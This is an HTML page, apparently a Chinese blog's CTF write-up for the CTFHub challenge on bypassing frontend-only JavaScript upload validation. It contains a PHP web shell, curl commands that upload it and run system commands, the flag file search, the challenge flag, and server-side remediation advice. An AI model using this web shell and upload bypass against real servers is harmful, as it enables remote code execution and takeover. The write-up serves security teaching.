@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub 文件上传 JS 前端验证 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - 文件上传 - JS 前端验证</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># 文件上传</span>
+            <span class="tag"># 前端验证</span>
+            <span class="tag"># RCE</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>文件上传 - JS 前端验证</li>
+            <li><strong>题目方向：</strong>Web - 文件上传</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目目标：</strong>绕过浏览器端扩展名白名单，上传可执行 PHP 文件并读取 Flag。</li>
+        </ul>
+
+        <h2>二、漏洞分析</h2>
+        <p>上传表单通过 <code>onsubmit="return checkfilesuffix()"</code> 在提交前执行 JavaScript 校验。函数仅按文件名后缀判断是否位于 <code>.jpg</code>、<code>.png</code>、<code>.gif</code> 白名单中：</p>
+        <pre>var whitelist = new Array(".jpg", ".png", ".gif");
+var file_suffix = file.substring(file.lastIndexOf("."));
+if (whitelist.indexOf(file_suffix) == -1) {
+    alert("该文件不允许上传");
+    return false;
+}</pre>
+        <p>该逻辑完全运行在浏览器中。攻击者可以删除或修改前端校验，也可以直接构造 HTTP 请求，绕过表单和 JavaScript 检查。服务端没有对扩展名、MIME 类型或文件内容进行二次校验，并且上传文件保留了原始扩展名，因此最终形成任意 PHP 代码执行。</p>
+
+        <h2>三、解题步骤</h2>
+        <ol>
+            <li>
+                <strong>查看前端校验：</strong>查看首页源码，定位 <code>checkfilesuffix()</code>，确认白名单只允许 <code>.jpg</code>、<code>.png</code>、<code>.gif</code>。由于校验仅存在于前端，不能视为安全控制。
+            </li>
+            <li>
+                <strong>构造 PHP Payload：</strong>创建 <code>shell.php</code>，通过 <code>cmd</code> 参数执行系统命令。
+                <pre>&lt;?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?&gt;</pre>
+            </li>
+            <li>
+                <strong>直接上传 PHP 文件：</strong>不经过浏览器表单，使用 <code>curl</code> 直接提交 multipart 请求，将文件名设置为 <code>shell.php</code>。
+                <pre>curl -F "file=@shell.php;filename=shell.php;type=application/octet-stream" \
+     -F "submit=Submit" \
+     http://&lt;challenge-host&gt;:10800/</pre>
+                上传成功后，响应返回可访问的相对路径：
+                <pre>&lt;script&gt;alert('上传成功')&lt;/script&gt;上传文件相对路径&lt;br&gt;upload/shell.php</pre>
+            </li>
+            <li>
+                <strong>验证代码执行：</strong>访问上传后的 PHP 文件并传入系统命令。
+                <pre>curl --get \
+  --data-urlencode "cmd=id; pwd; ls -la /" \
+  "http://&lt;challenge-host&gt;:10800/upload/shell.php"</pre>
+                响应确认当前用户为 <code>www-data</code>，命令执行目录为 <code>/var/www/html/upload</code>。
+            </li>
+            <li>
+                <strong>定位 Flag 文件：</strong>搜索文件名中包含 <code>flag</code> 的文件。
+                <pre>find / -maxdepth 4 -iname "*flag*" 2&gt;/dev/null | head -100</pre>
+                在结果中发现：
+                <pre>/var/www/html/flag_2827410910.php</pre>
+            </li>
+            <li>
+                <strong>读取 Flag：</strong>由于 Flag 文件内容是 PHP 注释，直接访问页面不会显示 Flag，需要读取源码。
+                <pre>cat /var/www/html/flag_2827410910.php</pre>
+                <pre>&lt;?php // ctfhub{91e0d8cd100de549337cab66}</pre>
+            </li>
+        </ol>
+
+        <h2>四、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{91e0d8cd100de549337cab66}
+        </div>
+
+        <h2>五、修复建议</h2>
+        <ul>
+            <li><strong>服务端白名单：</strong>不要依赖前端 JavaScript 校验，必须在服务端按扩展名实施严格白名单。</li>
+            <li><strong>校验文件内容：</strong>结合真实 MIME 类型和文件头检查，不能只信任请求中的 <code>Content-Type</code>。</li>
+            <li><strong>重命名存储：</strong>由服务端生成随机文件名，避免保留用户可控的扩展名。</li>
+            <li><strong>隔离上传目录：</strong>将上传文件存放在 Web 根目录之外，或关闭上传目录的脚本执行权限。</li>
+            <li><strong>最小权限：</strong>Web 服务进程应使用低权限账户，并限制对源码目录和系统命令的访问。</li>
+        </ul>
+    </div>
+</body>
+</html>
